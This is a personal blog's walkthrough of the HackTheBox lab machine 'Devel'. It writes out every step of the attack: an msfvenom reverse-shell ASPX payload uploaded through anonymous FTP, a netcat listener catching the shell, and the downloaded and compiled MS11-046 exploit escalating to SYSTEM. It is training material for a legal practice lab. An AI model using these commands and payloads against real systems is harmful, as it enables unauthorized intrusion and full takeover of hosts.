@@ -1,0 +1,203 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Devel | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Devel from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/9_devel/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Devel</h1> <p class="post-description">Devel from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/devel/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Devel Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/machines/Devel" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Lazy devs make for easy boxes. Welcome to Devel.</p> <p>Run nmap to discover the ports running on the server. Notice that anonymous login is allowed on the FTP. Further, the directory listing looks like the root folder of the website. Neat.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-A</span> <span class="nt">-oN</span> nmap 10.10.10.5
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-17 07:18 CST
+Nmap scan report <span class="k">for </span>10.10.10.5
+Host is up <span class="o">(</span>0.098s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Generate an aspx msfvenom payload.</p> <ul> <li>-p Set the payload for the windows machine</li> <li>LHOST=The IP of the tun0 interface</li> <li>LPORT=The port you want to connect to</li> <li>-f The format that you want the exploit</li> <li>-o The name of the file that the file will be called</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.29 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> aspx <span class="nt">-o</span> rev.aspx
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of aspx file: 2713 bytes
+Saved as: rev.aspx
+</code></pre></div></div> <p><br> Use the ftp service with the anonymous account and transfer the exploit file to victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.5:root<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password: 
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; put rev.aspx
+<span class="nb">local</span>: rev.aspx remote: rev.aspx
+229 Entering Extended Passive Mode <span class="o">(||</span>|49160|<span class="o">)</span>
+125 Data connection already open<span class="p">;</span> Transfer starting.
+100% |<span class="k">*************************************************************************************************************************************************</span>|  2751       13.73 MiB/s    <span class="nt">--</span>:-- ETA
+226 Transfer complete.
+2751 bytes sent <span class="k">in </span>00:00 <span class="o">(</span>27.34 KiB/s<span class="o">)</span>
+</code></pre></div></div> <p><br> Start a listener listening on the LPORT that was chosen in the msfvenom exploit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> In the web browser, navigate to the aspx that we just transfer.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/devel/browser.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Navigate in the Browser" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the listener and catch the shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.5] 49161
+Microsoft Windows <span class="o">[</span>Version 6.1.7600]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div> <p><br> Run whoami just to test the command execution and see who we are.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
+<span class="nb">whoami
+</span>iis apppool<span class="se">\w</span>eb
+</code></pre></div></div> <p><br> Run systeminfo to get a sense of the system that we are on.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          17/1/2025, 3:14:31 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor<span class="o">(</span>s<span class="o">)</span>:              1 Processor<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2645 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:<span class="se">\W</span>indows
+System Directory:          C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32
+Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
+System Locale:             el<span class="p">;</span>Greek
+Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Time Zone:                 <span class="o">(</span>UTC+02:00<span class="o">)</span> Athens, Bucharest, Istanbul
+Total Physical Memory:     3.071 MB
+Available Physical Memory: 2.470 MB
+Virtual Memory: Max Size:  6.141 MB
+Virtual Memory: Available: 5.552 MB
+Virtual Memory: In Use:    589 MB
+Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix<span class="o">(</span>s<span class="o">)</span>:                 N/A
+Network Card<span class="o">(</span>s<span class="o">)</span>:           1 NIC<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection 4
+                                 DHCP Enabled:    No
+                                 IP address<span class="o">(</span>es<span class="o">)</span>
+                                 <span class="o">[</span>01]: 10.10.10.5
+                                 <span class="o">[</span>02]: fe80::c83:f455:7b23:2631
+                                 <span class="o">[</span>03]: dead:beef::b8f4:f25d:3375:9e52
+                                 <span class="o">[</span>04]: dead:beef::c83:f455:7b23:2631
+</code></pre></div></div> <p><br> This version of Windows if vulnerable to MS11-046. Read up on the vulnerability.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/devel/bulletin.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Microsoft Bulletin" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046" rel="external nofollow noopener" target="_blank">Bulletin</a></p> <p><br> Perform further research to find an exploit for this particular vulnerability.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/devel/exploit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Exploit" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/40564" rel="external nofollow noopener" target="_blank">Bulletin</a></p> <p><br> Download the exploit into the local working folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/devel]
+└─<span class="nv">$ </span>wget https://www.exploit-db.com/raw/40564 <span class="nt">-O</span> MS11-046.c                                 
+<span class="nt">--2025-01-18</span> 22:56:53--  https://www.exploit-db.com/raw/40564
+Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.13
+Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified <span class="o">[</span>text/plain]
+Saving to: ‘MS11-046.c’
+
+MS11-046.c                                                     <span class="o">[</span>  &lt;<span class="o">=&gt;</span>                                                                                                                                    <span class="o">]</span>  31.91K   112KB/s    <span class="k">in </span>0.3s    
+
+2025-01-18 22:56:54 <span class="o">(</span>112 KB/s<span class="o">)</span> - ‘MS11-046.c’ saved <span class="o">[</span>32674]
+</code></pre></div></div> <p><br> Cross-compile the exploit for the Windows machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/devel]
+└─<span class="nv">$ </span>i686-w64-mingw32-gcc MS11-046.c <span class="nt">-o</span> MS11-046.exe <span class="nt">-lws2_32</span>
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/devel]
+└─<span class="nv">$ </span><span class="nb">ls
+</span>MS11-046.c  MS11-046.exe
+</code></pre></div></div> <p><br> Log into the FTP server and change into binary mode.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.5:root<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password: 
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; binary
+200 Type <span class="nb">set </span>to I.
+</code></pre></div></div> <p><br> Microsoft recommends binary mode for sending executables.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/devel/msftp.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Microsoft FTP" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp-binary" rel="external nofollow noopener" target="_blank">Bulletin</a></p> <p><br> Put the MS11-046.exe binary executable onto the victim server.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; put MS11-046.exe
+<span class="nb">local</span>: MS11-046.exe remote: MS11-046.exe
+229 Entering Extended Passive Mode <span class="o">(||</span>|49159|<span class="o">)</span>
+125 Data connection already open<span class="p">;</span> Transfer starting.
+100% |<span class="k">*************************************************************************************************************************************************</span>|   234 KiB  340.43 KiB/s    00:00 ETA
+226 Transfer complete.
+240005 bytes sent <span class="k">in </span>00:00 <span class="o">(</span>297.90 KiB/s<span class="o">)</span>
+</code></pre></div></div> <p><br></p> <p><br> Navigate to the webroot and execute the binary.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
+
+17/01/2025  04:27 ��    &lt;DIR&gt;          <span class="nb">.</span>
+17/01/2025  04:27 ��    &lt;DIR&gt;          ..
+18/03/2017  01:06 ��    &lt;DIR&gt;          aspnet_client
+17/03/2017  04:37 ��               689 iisstart.htm
+17/01/2025  04:27 ��           240.005 MS11-046.exe
+17/01/2025  04:19 ��             2.760 rev.aspx
+17/03/2017  04:37 ��           184.946 welcome.png
+               4 File<span class="o">(</span>s<span class="o">)</span>        428.400 bytes
+               3 Dir<span class="o">(</span>s<span class="o">)</span>   5.031.374.848 bytes free
+
+C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt;MS11-046.exe
+MS11-046.exe
+</code></pre></div></div> <p><br> Run whoami to confirm that we are SYSTEM.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\W</span>indows<span class="se">\S</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\b</span>abis<span class="se">\D</span>esktop&gt;type user.txt
+<span class="nb">type </span>user.txt
+&lt;redacted&gt;
+
+C:<span class="se">\U</span>sers<span class="se">\b</span>abis<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 4:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::3c76:3140:5f71:34a2
+   Temporary IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::c9e0:845d:c742:b8af
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::3c76:3140:5f71:34a2%15
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.5
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.254.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:6def%15
+                                       10.10.10.2
+
+Tunnel adapter isatap.<span class="o">{</span>0B2931D6-69F8-4A00-8E64-237C531D469C<span class="o">}</span>:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+   Connection-specific DNS Suffix  <span class="nb">.</span> :
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
+<span class="nb">type </span>root.txt
+&lt;redracted&gt;
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 4:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::3c76:3140:5f71:34a2
+   Temporary IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::c9e0:845d:c742:b8af
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::3c76:3140:5f71:34a2%15
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.5
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.254.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:6def%15
+                                       10.10.10.2
+
+Tunnel adapter isatap.<span class="o">{</span>0B2931D6-69F8-4A00-8E64-237C531D469C<span class="o">}</span>:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+   Connection-specific DNS Suffix  <span class="nb">.</span> :
+</code></pre></div></div> <p><br> I look forward to seeing you in the next one.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
